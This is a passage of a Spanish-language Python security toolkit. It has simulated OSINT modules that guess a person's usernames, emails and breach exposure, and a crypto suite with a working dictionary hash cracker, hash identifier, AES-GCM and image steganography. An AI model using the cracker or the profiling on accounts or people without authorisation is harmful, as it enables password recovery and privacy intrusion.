        logging.info("OSINTWeb (DeepDive Sentinel) inicializado - Funcionalidad Principal Pendiente de Desarrollo Completo.")
        UI.imprimir_advertencia("DeepDive Sentinel: Módulo en desarrollo avanzado. Funcionalidad actual limitada a placeholder.")

    def investigar(self):
        UI.imprimir_advertencia("Funcionalidad de OSINT Web (DeepDive Sentinel) está en desarrollo y no implementada completamente.")
        url_objetivo_osintw = UI.obtener_entrada("[+] Dominio o URL base para investigación OSINT Web (ej: example.com): ")
        if not url_objetivo_osintw: return
        UI.imprimir_mensaje(f"Investigando (simulado): {url_objetivo_osintw}", Colores.CYAN)
        time.sleep(0.5)
        # Simulación de hallazgos
        hallazgos_simulados = {
            "dominio": url_objetivo_osintw,
            "whois": {"registrante": "REDACTED FOR PRIVACY", "fecha_creacion": "2010-05-15", "servidores_dns": ["ns1.example.com", "ns2.example.com"]},
            "tecnologias_detectadas": ["Nginx", "PHP", "WordPress", "jQuery"],
            "emails_encontrados_pagina_principal": [f"contact@{url_objetivo_osintw}", f"info@{url_objetivo_osintw}"],
            "archivos_interesantes_robots_txt": ["/wp-admin/", "/backup-staging/"],
            "potenciales_subdominios_comunes": [f"blog.{url_objetivo_osintw}", f"shop.{url_objetivo_osintw}", f"dev.{url_objetivo_osintw}"]
        }
        UI.imprimir_exito("Simulación OSINT Web completada. Mostrando algunos hallazgos:")
        for k,v in hallazgos_simulados.items():
            if isinstance(v,dict):
                UI.imprimir_mensaje(f"  {k.replace('_',' ').title()}:", Colores.BLANCO)
                for sub_k, sub_v in v.items(): UI.imprimir_mensaje(f"    {sub_k.replace('_',' ').title()}: {sub_v}", Colores.GRIS)
            else:
                UI.imprimir_mensaje(f"  {k.replace('_',' ').title()}: {v}", Colores.BLANCO)
        
        if UI.obtener_entrada("[+] ¿Guardar reporte OSINT Web simulado? (s/n)", tipo=bool, default='s'):
            UI.guardar_reporte(f"DeepDiveSentinel_Simulado_{url_objetivo_osintw.replace('.','_')}", hallazgos_simulados, "txt")


# ===== [ OSINT PERSONAS "SHADOWNET INTEL" ] =====
class OSINTPersonas:
    ART_ASCII = f"""{Colores.AZUL}
   ▄████████  ▄█▄    ▄████████    ▄▄▄▄███▄▄▄▄      ▄████████    ▄████████ ████████▄     ▄█████▄   
  ███    ███ ███   ███    ███   ▄██▀▀▀███▀▀▀██▄   ███    ███   ███    ███ ███   ▀███   ██▀    ▀   
  ███    █▀  ███   ███    █▀    ███   ███   ███   ███    █▀    ███    ███ ███    ███  ▄██സാമൂഹിക 
  ███        ███  ▄███▄▄▄       ███   ███   ███  ▄███▄▄▄      ▄███▄▄▄▄██▀ ███    ███   ▀▀█████▄  
▀███████████ ███ ▀▀███▀▀▀        ███   ███   ███ ▀▀███▀▀▀     ▀▀███▀▀▀▀▀   ███    ███   разведка 
  ███    ███ ███   ███    █▄    ███   ███   ███   ███    █▄  ▀███████████ ███    ███   ██▄▄▄▀███ 
  ███    ███ ███   ███    ███   ███   ███   ███   ███    ███   ███    ███ ███   ▄███   ▀██████▀▀ 
  ███    ███ █▀    ██████████    ▀█   ███   █▀    ██████████   ███    ███ ████████▀      人格搜寻 
{Colores.BLANCO}                                OSINT Personas "ShadowNet Intel"{Colores.RESET}"""
    # ... (Implementación completa de OSINTPersonas - Extensa)
    # Implica: Generación de usernames y emails, búsqueda en plataformas (requiere adaptar URLs y parseo),
    # HIBP, Google Dorks para personas, EXIF de imágenes locales, búsqueda inversa de imágenes (conceptual/links).
    def __init__(self): 
        UI.imprimir_mensaje(self.ART_ASCII, Colores.AZUL, prefix="")
        logging.info("OSINTPersonas (ShadowNet Intel) inicializado - Funcionalidad Principal Pendiente de Desarrollo Completo.")
        UI.imprimir_advertencia("ShadowNet Intel: Módulo en desarrollo avanzado. Funcionalidad actual limitada a placeholder.")

    def investigar_persona(self):
        UI.imprimir_advertencia("Funcionalidad de OSINT Personas (ShadowNet Intel) está en desarrollo y no implementada completamente.")
        nombre_completo = UI.obtener_entrada("[+] Nombre completo de la persona (o alias principal): ")
        if not nombre_completo: return
        UI.imprimir_mensaje(f"Investigando (simulado): {nombre_completo}", Colores.CYAN)
        time.sleep(0.5)
        # Simulación de hallazgos
        username_base = "".join(nombre_completo.lower().split())
        hallazgos_simulados = {
            "nombre_investigado": nombre_completo,
            "posibles_usernames": [username_base, f"{username_base}123", f"{nombre_completo.split()[0].lower()}_{nombre_completo.split()[-1].lower() if len(nombre_completo.split()) > 1 else ''}"],
            "posibles_emails": [f"{username_base}@gmail.com", f"{username_base}@outlook.com", f"{nombre_completo.split()[0].lower()}.{nombre_completo.split()[-1].lower() if len(nombre_completo.split()) > 1 else ''}@example-corp.com"],
            "perfiles_encontrados_simulado": {
                "Twitter": f"https://twitter.com/{username_base} (Simulado - Podría existir)",
                "GitHub": f"https://github.com/{username_base} (Simulado - Podría existir)"
            },
            "brechas_hibp_simulado": [f"Brecha en 'ForoXWZ' (email: {username_base}@gmail.com, datos expuestos: password, IP)"] if CONFIG.get("hibp_api_key") else "HIBP no consultado (API Key no configurada)"
        }
        UI.imprimir_exito("Simulación OSINT Personas completada. Mostrando algunos hallazgos:")
        for k,v in hallazgos_simulados.items():
            if isinstance(v,dict):
                UI.imprimir_mensaje(f"  {k.replace('_',' ').title()}:", Colores.BLANCO)
                for sub_k, sub_v in v.items(): UI.imprimir_mensaje(f"    {sub_k.replace('_',' ').title()}: {sub_v}", Colores.GRIS)
            elif isinstance(v, list):
                 UI.imprimir_mensaje(f"  {k.replace('_',' ').title()}:", Colores.BLANCO)
                 for item_l in v: UI.imprimir_mensaje(f"    - {item_l}", Colores.GRIS)
            else:
                UI.imprimir_mensaje(f"  {k.replace('_',' ').title()}: {v}", Colores.BLANCO)
        
        if UI.obtener_entrada("[+] ¿Guardar reporte OSINT Personas simulado? (s/n)", tipo=bool, default='s'):
            UI.guardar_reporte(f"ShadowNetIntel_Simulado_{username_base}", hallazgos_simulados, "txt")


# ===== [ UTILIDADES CRIPTO "ENIGMAVAULT" ] =====
class UtilidadesCripto:
    ART_ASCII = f"""{Colores.VERDE}
    ███████╗███╗   ██╗██╗ ██████╗ ███╗   ███╗ █████╗     ██╗   ██╗ █████╗ ██╗  ██╗████████╗
    ██╔════╝████╗  ██║██║██╔════╝ ████╗ ████║██╔══██╗   ██║   ██║██╔══██╗██║  ██║╚══██╔══╝
    █████╗  ██╔██╗ ██║██║██║  ███╗██╔████╔██║███████║   ██║   ██║███████║███████║   ██║   
    ██╔══╝  ██║╚██╗██║██║██║   ██║██║╚██╔╝██║██╔══██║   ╚██╗ ██╔╝██╔══██║██╔══██║   ██║   
    ███████╗██║ ╚████║██║╚██████╔╝██║ ╚═╝ ██║██║  ██║    ╚████╔╝ ██║  ██║██║  ██║   ██║   
    ╚══════╝╚═╝  ╚═══╝╚═╝ ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝     ╚═══╝  ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   
{Colores.BLANCO}                                Utilidades Cripto "EnigmaVault"{Colores.RESET}"""
    HASH_ALGORITHMS_CRYPTO = sorted(["md5", "sha1", "sha224", "sha256", "sha384", "sha512", 
                              "sha3_224", "sha3_256", "sha3_384", "sha3_512",
                              "blake2b", "blake2s", "md4", "ripemd160", "whirlpool"]) # md4, ripemd160, whirlpool pueden requerir OpenSSL
    # Hash lengths for identification
    HASH_LENGTHS = { 32: ["md5", "md4", "ntlm"], 40: ["sha1", "ripemd160"], 56: ["sha224", "sha3_224"], 
                     64: ["sha256", "sha3_256", "blake2s (default)"], 96: ["sha384", "sha3_384"],
                     128: ["sha512", "sha3_512", "blake2b (default)", "whirlpool"] }


    def __init__(self):
        UI.imprimir_mensaje(self.ART_ASCII, Colores.VERDE, prefix="")
        logging.info("UtilidadesCripto (EnigmaVault) inicializado.")

    def _codificar_decodificar_base(self, data, base_num, accion="codificar"):
        # base64, base32, base16 (hex)
        try:
            data_bytes = data.encode('utf-8') if isinstance(data, str) else data
            if accion == "codificar":
                if base_num == 64: encoded = base64.b64encode(data_bytes)
                elif base_num == 32: encoded = base64.b32encode(data_bytes)
                elif base_num == 16: encoded = base64.b16encode(data_bytes)
                elif base_num == 85: encoded = base64.a85encode(data_bytes) # Ascii85
                else: UI.imprimir_error(f"Base {base_num} no soportada para codificación."); return None
                return encoded.decode('utf-8')
            elif accion == "decodificar":
                if base_num == 64: decoded = base64.b64decode(data_bytes)
                elif base_num == 32: decoded = base64.b32decode(data_bytes)
                elif base_num == 16: decoded = base64.b16decode(data_bytes)
                elif base_num == 85: decoded = base64.a85decode(data_bytes)
                else: UI.imprimir_error(f"Base {base_num} no soportada para decodificación."); return None
                try: return decoded.decode('utf-8') # Intentar decodificar a UTF-8
                except UnicodeDecodeError: return decoded # Devolver bytes si no es UTF-8 válido
            else: UI.imprimir_error("Acción no válida (codificar/decodificar)."); return None
        except Exception as e:
            UI.imprimir_error(f"Error en Base{base_num} {accion}: {e}"); return None

    def _url_encode_decode(self, data, accion="codificar"):
        try:
            if accion == "codificar": return quote_plus(data)
            elif accion == "decodificar": return unquote_plus(data)
            else: UI.imprimir_error("Acción no válida."); return None
        except Exception as e: UI.imprimir_error(f"Error en URL {accion}: {e}"); return None

    def _generar_hash(self, data, algoritmo):
        algoritmo = algoritmo.lower()
        try:
            data_bytes = data.encode('utf-8') if isinstance(data, str) else data
            
            # hashlib.new puede necesitar que OpenSSL soporte algunos (md4, ripemd160, whirlpool)
            if algoritmo in hashlib.algorithms_available:
                h = hashlib.new(algoritmo)
                h.update(data_bytes)
                return h.hexdigest()
            else:
                # Fallback para algunos que podrían no estar en hashlib.algorithms_available pero sí como funciones directas
                if algoritmo == "md5": return hashlib.md5(data_bytes).hexdigest()
                elif algoritmo == "sha1": return hashlib.sha1(data_bytes).hexdigest()
                elif algoritmo == "sha256": return hashlib.sha256(data_bytes).hexdigest()
                # ... etc.
                else:
                    UI.imprimir_error(f"Algoritmo de hash '{algoritmo}' no soportado por hashlib en este sistema.")
                    UI.imprimir_advertencia(f"Algoritmos disponibles: {', '.join(sorted(list(hashlib.algorithms_available)))}")
                    return None
        except Exception as e:
            UI.imprimir_error(f"Error generando hash {algoritmo}: {e}"); return None

    def _identificar_hash(self, hash_input):
        hash_len = len(hash_input)
        posibles_tipos = self.HASH_LENGTHS.get(hash_len, [])
        
        # Chequear si es hexadecimal
        if not re.match(r"^[0-9a-fA-F]+$", hash_input):
            UI.imprimir_advertencia("El input no parece ser un hash hexadecimal puro.")
            # Podría ser Base64, etc. Se podría añadir más lógica aquí.
            if re.match(r"^\$2[aby]\$\d{2}\$.{53}$", hash_input): posibles_tipos.append("bcrypt")
            if re.match(r"^\$apr1\$.{8}\$.{22}$", hash_input): posibles_tipos.append("MD5-APR (Apache)")
            if re.match(r"^\$1\$.{8}\$.{22}$", hash_input): posibles_tipos.append("MD5-crypt")
            if re.match(r"^\$5\$.{8,16}\$.{43}$", hash_input) or re.match(r"^\$sha256\$.{8,16}\$.{43}$", hash_input): posibles_tipos.append("SHA256-crypt")
            if re.match(r"^\$6\$.{8,16}\$.{86}$", hash_input) or re.match(r"^\$sha512\$.{8,16}\$.{86}$", hash_input): posibles_tipos.append("SHA512-crypt")
            if re.match(r"^[LMNT]*[0-9A-F]{32}(:[0-9A-F]{32})?$", hash_input, re.I): posibles_tipos.append("NTLM/LM (Windows)")


        if posibles_tipos:
            UI.imprimir_exito(f"Posibles tipos de hash para longitud {hash_len}: {', '.join(posibles_tipos)}")
            return posibles_tipos
        else:
            UI.imprimir_error(f"No se pudo identificar el tipo de hash para longitud {hash_len}.")
            return []

    def _cracker_hash_diccionario(self, hash_a_crackear, tipo_hash, ruta_diccionario):
        if not os.path.exists(ruta_diccionario):
            UI.imprimir_error(f"Diccionario no encontrado: {ruta_diccionario}"); return None
        
        tipo_hash = tipo_hash.lower()
        if tipo_hash not in self.HASH_ALGORITHMS_CRYPTO and tipo_hash not in ["ntlm", "bcrypt", "md5-crypt", "sha256-crypt", "sha512-crypt"]: # Añadir más si se soportan
            UI.imprimir_error(f"Tipo de hash '{tipo_hash}' no soportado para cracking en esta utilidad.")
            return None

        UI.imprimir_mensaje(f"Iniciando cracking de hash {tipo_hash} ({hash_a_crackear[:20]}...) con diccionario: {os.path.basename(ruta_diccionario)}", Colores.CYAN)
        
        encontrado = None
        intentos = 0
        tiempo_inicio = time.time()

        # Abrir diccionario (puede ser grande, gz, bz2)
        try:
            with DescifradorArchivos()._abrir_diccionario(ruta_diccionario) as f_dict: # Reutilizar método
                # Contar líneas para tqdm (opcional, puede ser lento para archivos muy grandes)
                total_lineas_estimado = 0
                # if TQDM_DISPONIBLE:
                #     UI.imprimir_mensaje("Contando palabras en diccionario para barra de progreso...", Colores.GRIS)
                #     # No podemos hacer len(f_dict.readlines()) con archivos grandes o comprimidos directamente
                #     # Volver a abrir para contar es una opción, o prescindir del total.
                #     # Por simplicidad, y si no hay otra forma fácil, se omite el total para tqdm aquí.
                
                pbar_hash = None
                if TQDM_DISPONIBLE:
                    pbar_hash = tqdm(total=None, unit=" pass", desc=f"{Colores.MAGENTA}Crackeando Hash{Colores.RESET}", ncols=100)

                for palabra in f_dict:
                    intentos += 1
                    palabra_limpia = palabra.strip()
                    if not palabra_limpia: continue

                    if pbar_hash: pbar_hash.update(1)
                    elif intentos % 50000 == 0: # Feedback sin tqdm
                        print(f"{Colores.GRIS}[*] Probadas {intentos:,} contraseñas...{Colores.RESET}", end='\r', flush=True)

                    hash_calculado = self._generar_hash(palabra_limpia, tipo_hash) # Usar el generador interno
                    if hash_calculado and hash_calculado == hash_a_crackear.lower():
                        encontrado = palabra_limpia
                        break
                
                if pbar_hash: pbar_hash.close()
                else: print(" "*80, end='\r') # Limpiar línea

        except FileNotFoundError: return None # Ya manejado
        except Exception as e_crack_hash:
            UI.imprimir_error(f"Error durante el cracking de hash: {e_crack_hash}")
            logging.error(f"Error crackeando hash: {e_crack_hash}", exc_info=True)
            return None
            
        tiempo_fin = time.time()
        UI.imprimir_mensaje(f"Proceso finalizado. Intentos: {intentos:,}. Tiempo: {tiempo_fin - tiempo_inicio:.2f}s", Colores.CYAN)
        if encontrado:
            UI.imprimir_exito(f"¡HASH DESCIFRADO! -> {encontrado}")
        else:
            UI.imprimir_error("Hash no encontrado en el diccionario.")
        return encontrado

    def _generador_contrasenas_seguras(self, longitud, usar_mayus, usar_minus, usar_numeros, usar_simbolos, simbolos_custom=""):
        charset = ""
        password_generada = []

        if usar_mayus: 
            charset += DescifradorArchivos.CARACTERES_DEFAULT['u']
            password_generada.append(random.choice(DescifradorArchivos.CARACTERES_DEFAULT['u']))
        if usar_minus: 
            charset += DescifradorArchivos.CARACTERES_DEFAULT['l']
            password_generada.append(random.choice(DescifradorArchivos.CARACTERES_DEFAULT['l']))
        if usar_numeros: 
            charset += DescifradorArchivos.CARACTERES_DEFAULT['d']
            password_generada.append(random.choice(DescifradorArchivos.CARACTERES_DEFAULT['d']))
        
        simbolos_finales = DescifradorArchivos.CARACTERES_DEFAULT['s']
        if simbolos_custom: simbolos_finales = simbolos_custom
        
        if usar_simbolos:
            charset += simbolos_finales
            password_generada.append(random.choice(simbolos_finales))

        if not charset:
            UI.imprimir_error("Debes seleccionar al menos un tipo de caracter para generar la contraseña.")
            return None

        # Rellenar el resto de la contraseña
        longitud_restante = longitud - len(password_generada)
        if longitud_restante < 0: # Si la longitud es menor que los caracteres obligatorios
            UI.imprimir_advertencia("Longitud solicitada es muy corta para incluir todos los tipos de caracteres seleccionados. Se usará una contraseña más corta de los tipos seleccionados.")
            password_generada = password_generada[:longitud] # Truncar a la longitud deseada
        else:
            for _ in range(longitud_restante):
                password_generada.append(random.choice(charset))
        
        random.shuffle(password_generada) # Mezclar para que los caracteres obligatorios no estén siempre al principio
        return "".join(password_generada)

    def _cifrado_aes(self, data, key_password, accion="cifrar", salt=None, iv=None):
        if not CRYPTOGRAPHY_LIB_DISPONIBLE:
            UI.imprimir_error("Librería 'cryptography' no instalada. AES no disponible."); return None
        
        try:
            data_bytes = data.encode('utf-8') if isinstance(data, str) and accion=="cifrar" else data
            
            # Derivar clave desde contraseña
            if salt is None: salt = os.urandom(16) # Generar salt si no se provee (para cifrado)
            
            kdf = PBKDF2HMAC(
                algorithm=crypto_hashes.SHA256(),
                length=32, # AES-256
                salt=salt,
                iterations=100000, # Iteraciones recomendadas
                backend=default_backend()
            )
            key = kdf.derive(key_password.encode('utf-8'))

            if accion == "cifrar":
                # Usar AES-GCM para cifrado autenticado (mejor que CBC con padding)
                if iv is None: iv = os.urandom(12) # GCM usualmente usa IV de 12 bytes
                cipher = Cipher(algorithms.AES(key), modes.GCM(iv), backend=default_backend())
                encryptor = cipher.encryptor()
                ciphertext = encryptor.update(data_bytes) + encryptor.finalize()
                # Devolver salt, iv, ciphertext y tag (GCM tag)
                return {"salt": salt, "iv": iv, "ciphertext": ciphertext, "tag": encryptor.tag}
            
            elif accion == "descifrar":
                if not all([salt, iv, data_bytes]): # data_bytes aquí es el ciphertext
                    UI.imprimir_error("Para descifrar, se necesitan salt, iv y ciphertext."); return None
                
                # El tag debe ser proveído por el usuario o almacenado junto al ciphertext
                # Para este ejemplo, asumimos que el tag está al final del ciphertext si no se pasa explícitamente
                # Esto es una simplificación. En un sistema real, el tag se maneja por separado.
                # Aquí, data_bytes es el ciphertext. Asumimos que el tag NO está incluido.
                # Se necesitaría pasar el tag como otro argumento. 
                # Por ahora, vamos a asumir que el usuario lo tiene y la función lo pediría.
                # Para simplificar el API de esta función, vamos a suponer que el tag viene con el ciphertext
                # como los últimos 16 bytes (GCM tag suele ser de 16 bytes).
                # ESTO NO ES IDEAL, el tag debería pasarse por separado.
                if len(data_bytes) < 16: UI.imprimir_error("Ciphertext demasiado corto para contener tag GCM."); return None
                
                actual_ciphertext = data_bytes[:-16]
                tag_gcm = data_bytes[-16:]

                cipher = Cipher(algorithms.AES(key), modes.GCM(iv, tag_gcm), backend=default_backend())
                decryptor = cipher.decryptor()
                plaintext_bytes = decryptor.update(actual_ciphertext) + decryptor.finalize()
                try: return plaintext_bytes.decode('utf-8')
                except UnicodeDecodeError: return plaintext_bytes # Devolver bytes si no es UTF-8
            else: UI.imprimir_error("Acción no válida (cifrar/descifrar)."); return None

        except ImportError: UI.imprimir_error("Librería 'cryptography' no instalada."); return None
        except Exception as e:
            UI.imprimir_error(f"Error en AES {accion}: {e}");
            logging.error(f"Error AES: {e}", exc_info=True)
            return None
            
    def _esteganografia_lsb_imagen(self, ruta_imagen, accion="ocultar", mensaje_o_ruta_salida=None):
        if not PILLOW_DISPONIBLE:
            UI.imprimir_error("Librería 'Pillow' no instalada. Esteganografía LSB no disponible."); return False

        def mensaje_a_binario(mensaje):
            # Convertir mensaje a binario, añadiendo un delimitador para saber dónde termina.
            # Delimitador: 8 ceros seguidos de 8 unos ( improbable en datos normales)
            # O más simple: longitud del mensaje al principio.
            # Optaremos por un delimitador simple: 16 bits de 1 (0xFFFF)
            delimiter = "1" * 16 
            bin_msg = ''.join(format(ord(char), '08b') for char in mensaje) + delimiter
            return bin_msg

        def binario_a_mensaje(bin_data):
            delimiter = "1" * 16
            if delimiter not in bin_data: return None # No se encontró el delimitador
            
            bin_msg_only = bin_data.split(delimiter)[0]
            mensaje = ""
            for i in range(0, len(bin_msg_only), 8):
                byte_bin = bin_msg_only[i:i+8]
                if len(byte_bin) < 8: break # Byte incompleto
                mensaje += chr(int(byte_bin, 2))
            return mensaje

        try:
            img = Image.open(ruta_imagen)
            img = img.convert("RGB") # Asegurar formato RGB
            pixels = img.load()
            width, height = img.size

            if accion == "ocultar":
                if not mensaje_o_ruta_salida: UI.imprimir_error("Se necesita un mensaje para ocultar."); return False
                mensaje_bin = mensaje_a_binario(mensaje_o_ruta_salida)
                msg_len = len(mensaje_bin)
                
                if msg_len > width * height * 3: # 3 bits por pixel (R,G,B) si usamos 1 LSB por canal
                    UI.imprimir_error("El mensaje es demasiado largo para ocultar en esta imagen."); return False

                data_idx = 0
                for y in range(height):
                    for x in range(width):
                        if data_idx >= msg_len: break
                        r, g, b = pixels[x, y]
                        
                        # Modificar LSB de R
                        if data_idx < msg_len:
                            r = (r & ~1) | int(mensaje_bin[data_idx]); data_idx += 1
                        # Modificar LSB de G
                        if data_idx < msg_len:
                            g = (g & ~1) | int(mensaje_bin[data_idx]); data_idx += 1
                        # Modificar LSB de B
                        if data_idx < msg_len:
                            b = (b & ~1) | int(mensaje_bin[data_idx]); data_idx += 1
                        
                        pixels[x, y] = (r, g, b)
                    if data_idx >= msg_len: break
                
                nombre_salida_stego = f"{os.path.splitext(ruta_imagen)[0]}_stego.png" # Guardar como PNG (lossless)
                img.save(nombre_salida_stego, "PNG")
                UI.imprimir_exito(f"Mensaje oculto en: {nombre_salida_stego}")
                return True

            elif accion == "revelar":
                bin_data_extraida = ""
                delimiter_found = False
                delimiter_pattern = "1" * 16

                for y in range(height):
                    for x in range(width):
                        r, g, b = pixels[x, y]
                        bin_data_extraida += str(r & 1)
                        if bin_data_extraida.endswith(delimiter_pattern): delimiter_found = True; break
                        bin_data_extraida += str(g & 1)
                        if bin_data_extraida.endswith(delimiter_pattern): delimiter_found = True; break
                        bin_data_extraida += str(b & 1)
                        if bin_data_extraida.endswith(delimiter_pattern): delimiter_found = True; break
                    if delimiter_found: break
                
                if not delimiter_found:
                    UI.imprimir_error("No se encontró delimitador de mensaje oculto.")
                    return None
                
                mensaje_oculto = binario_a_mensaje(bin_data_extraida)
                if mensaje_oculto:
                    UI.imprimir_exito(f"Mensaje oculto revelado: {mensaje_oculto}")
                    if mensaje_o_ruta_salida and isinstance(mensaje_o_ruta_salida, str): # Ruta para guardar
                        try:
                            with open(mensaje_o_ruta_salida, "w", encoding="utf-8") as f_out_stego:
                                f_out_stego.write(mensaje_oculto)
                            UI.imprimir_exito(f"Mensaje revelado guardado en: {mensaje_o_ruta_salida}")
                        except Exception as e_save_stego: UI.imprimir_error(f"Error guardando mensaje revelado: {e_save_stego}")
                    return mensaje_oculto
                else:
                    UI.imprimir_error("No se pudo decodificar el mensaje oculto.")
                    return None
            else: UI.imprimir_error("Acción no válida (ocultar/revelar)."); return False
        except FileNotFoundError: UI.imprimir_error(f"Archivo de imagen no encontrado: {ruta_imagen}"); return False
        except Exception as e: UI.imprimir_error(f"Error en esteganografía LSB: {e}"); return False


    def menu_utilidades(self):
        while True:
            limpiar_pantalla(); UI.imprimir_banner_animado()
            UI.imprimir_mensaje("Suite de Utilidades Criptográficas 'EnigmaVault'", Colores.MAGENTA)
            opciones_enigma = {
                "1": "Codificar/Decodificar Base (16/32/64/85)",
                "2": "Codificar/Decodificar URL",
                "3": "Generar Hash (MD5, SHA*, BLAKE2, etc.)",
                "4": "Identificar Tipo de Hash",
                "5": "Crackear Hash con Diccionario",
                "6": "Generador de Contraseñas Seguras",
                "7": "Cifrar/Descifrar con AES-256-GCM (requiere 'cryptography')",
                "8": "Esteganografía LSB en Imágenes (ocultar/revelar, requiere 'Pillow')",
                "9": "Volver al Menú Principal"
            }
            for k,v in opciones_enigma.items(): UI.imprimir_mensaje(f"[{k}] {v}", Colores.BLANCO)
            
            opcion = UI.obtener_entrada("[+] Elige una utilidad Enigma: ", opciones_validas=opciones_enigma.keys())

            if opcion == "1": # Base Encoder/Decoder
                accion_base = UI.obtener_entrada("¿[C]odificar o [D]ecodificar Base? ", opciones_validas=["C","D","c","d"], default="C").upper()
                base_val = UI.obtener_entrada("Base (16, 32, 64, 85): ", tipo=int, opciones_validas=[16,32,64,85], default=64)
                data_base = UI.obtener_entrada("Introduce los datos: ", requerido=True)
                if data_base:
                    resultado_base = self._codificar_decodificar_base(data_base, base_val, "codificar" if accion_base=="C" else "decodificar")
                    if resultado_base is not None: UI.imprimir_exito(f"Resultado Base{base_val} ({'Codificado' if accion_base=='C' else 'Decodificado'}): {resultado_base}")
            
            elif opcion == "2": # URL Encoder/Decoder
                accion_url = UI.obtener_entrada("¿[C]odificar o [D]ecodificar URL? ", opciones_validas=["C","D","c","d"], default="C").upper()
                data_url = UI.obtener_entrada("Introduce los datos URL: ", requerido=True)
                if data_url:
                    resultado_url = self._url_encode_decode(data_url, "codificar" if accion_url=="C" else "decodificar")
                    if resultado_url: UI.imprimir_exito(f"Resultado URL ({'Codificado' if accion_url=='C' else 'Decodificado'}): {resultado_url}")

            elif opcion == "3": # Generar Hash
                data_hash = UI.obtener_entrada("Introduce los datos para hashear: ", requerido=True)
                UI.imprimir_mensaje(f"Algoritmos comunes: {', '.join(self.HASH_ALGORITHMS_CRYPTO[:5])}...", Colores.GRIS)
                algo_hash = UI.obtener_entrada(f"Algoritmo de hash (ej: md5, sha256): ", default="sha256", opciones_validas=self.HASH_ALGORITHMS_CRYPTO).lower()
                if data_hash:
                    hash_generado = self._generar_hash(data_hash, algo_hash)
                    if hash_generado: UI.imprimir_exito(f"Hash {algo_hash.upper()}: {hash_generado}")
            
            elif opcion == "4": # Identificar Hash
                hash_id_input = UI.obtener_entrada("Introduce el hash a identificar: ", requerido=True)
                if hash_id_input: self._identificar_hash(hash_id_input)

            elif opcion == "5": # Crackear Hash
                hash_crack_input = UI.obtener_entrada("Introduce el hash a crackear: ", requerido=True)
                if not hash_crack_input: continue
                
                posibles_tipos = self._identificar_hash(hash_crack_input) # Sugerir tipo
                default_tipo_crack = posibles_tipos[0] if posibles_tipos else self.HASH_ALGORITHMS_CRYPTO[0]
                
                tipo_hash_crack = UI.obtener_entrada(f"Tipo de hash (ej: {default_tipo_crack}): ", default=default_tipo_crack, opciones_validas=self.HASH_ALGORITHMS_CRYPTO + ["ntlm"]).lower() # Añadir más soportados
                
                default_wl_path = CONFIG.get("wordlist_path_hash_crack", "")
                ruta_dicc_crack = UI.obtener_entrada(f"Ruta del diccionario: ", default=default_wl_path, requerido=True)
                if ruta_dicc_crack : self._cracker_hash_diccionario(hash_crack_input, tipo_hash_crack, ruta_dicc_crack)
            
            elif opcion == "6": # Generador Contraseñas
                long_pass = UI.obtener_entrada("Longitud de la contraseña: ", tipo=int, default=16, opciones_validas=range(8,129))
                usar_mayus_pass = UI.obtener_entrada("¿Incluir mayúsculas (ABC)? (s/n)", default="s", tipo=bool)
                usar_minus_pass = UI.obtener_entrada("¿Incluir minúsculas (abc)? (s/n)", default="s", tipo=bool)
                usar_num_pass = UI.obtener_entrada("¿Incluir números (123)? (s/n)", default="s", tipo=bool)
                usar_sym_pass = UI.obtener_entrada("¿Incluir símbolos (!@#)? (s/n)", default="s", tipo=bool)
                sym_custom_pass = ""
                if usar_sym_pass:
                    sym_custom_pass = UI.obtener_entrada(f"Símbolos personalizados (default: {DescifradorArchivos.CARACTERES_DEFAULT['s']}): ", default="", requerido=False)
                
                password_gen = self._generador_contrasenas_seguras(long_pass, usar_mayus_pass, usar_minus_pass, usar_num_pass, usar_sym_pass, sym_custom_pass)
                if password_gen: UI.imprimir_exito(f"Contraseña Generada: {Colores.BLANCO}{Colores.NEGRITA}{password_gen}{Colores.RESET}")
            
            elif opcion == "7": # Cifrado AES
                if not CRYPTOGRAPHY_LIB_DISPONIBLE: UI.imprimir_error("Librería 'cryptography' no disponible."); UI.presionar_enter_continuar(); continue
                accion_aes = UI.obtener_entrada("¿[C]ifrar o [D]escifrar con AES? ", opciones_validas=["C","D","c","d"], default="C").upper()
                key_pass_aes = UI.obtener_entrada("Introduce la contraseña para AES: ", ocultar_entrada=True, requerido=True)
                if not key_pass_aes: continue

                if accion_aes == "C":
                    data_aes_c = UI.obtener_entrada("Texto a cifrar: ", requerido=True)
                    if data_aes_c:
                        resultado_aes_c = self._cifrado_aes(data_aes_c, key_pass_aes, "cifrar")
                        if resultado_aes_c:
                            UI.imprimir_exito("Datos cifrados con AES-256-GCM:")
                            UI.imprimir_mensaje(f"  Salt (hex): {resultado_aes_c['salt'].hex()}", Colores.BLANCO)
                            UI.imprimir_mensaje(f"  IV (hex): {resultado_aes_c['iv'].hex()}", Colores.BLANCO)
                            UI.imprimir_mensaje(f"  Ciphertext (Base64): {base64.b64encode(resultado_aes_c['ciphertext']).decode()}", Colores.BLANCO)
                            UI.imprimir_mensaje(f"  GCM Tag (hex): {resultado_aes_c['tag'].hex()}", Colores.BLANCO)
                            UI.imprimir_advertencia("IMPORTANTE: Guarda Salt, IV, Ciphertext y Tag para descifrar.")
                elif accion_aes == "D":
                    salt_hex_aes_d = UI.obtener_entrada_requerida("Salt (hex) para descifrar: ")
                    iv_hex_aes_d = UI.obtener_entrada_requerida("IV (hex) para descifrar: ")
                    cipher_b64_aes_d = UI.obtener_entrada_requerida("Ciphertext (Base64) para descifrar: ")
                    tag_hex_aes_d = UI.obtener_entrada_requerida("GCM Tag (hex) para descifrar: ")
                    
                    try:
                        salt_aes_d = bytes.fromhex(salt_hex_aes_d)
                        iv_aes_d = bytes.fromhex(iv_hex_aes_d)
                        cipher_aes_d = base64.b64decode(cipher_b64_aes_d)
                        # Aquí, el tag se pasa directamente al método de cifrado (modificado)
                        # O, si el método _cifrado_aes espera el tag concatenado, se haría aquí.
                        # Modificaremos _cifrado_aes para tomar el tag por separado para GCM.
                        # El método _cifrado_aes actual ya asume que el tag está en data_bytes.
                        # Vamos a simplificar y asumir que el ciphertext que espera _cifrado_aes ya tiene el tag al final
                        cipher_with_tag_aes_d = cipher_aes_d + bytes.fromhex(tag_hex_aes_d) # Esto es si _cifrado_aes lo espera así.
                        
                        # Re-evaluando: _cifrado_aes en modo 'descifrar' ya maneja la separación del tag si se pasa data_bytes = ciphertext + tag.
                        # Así que, la línea anterior es correcta si _cifrado_aes usa los últimos 16 bytes como tag.

                        plaintext_aes_d = self._cifrado_aes(cipher_with_tag_aes_d, key_pass_aes, "descifrar", salt=salt_aes_d, iv=iv_aes_d)
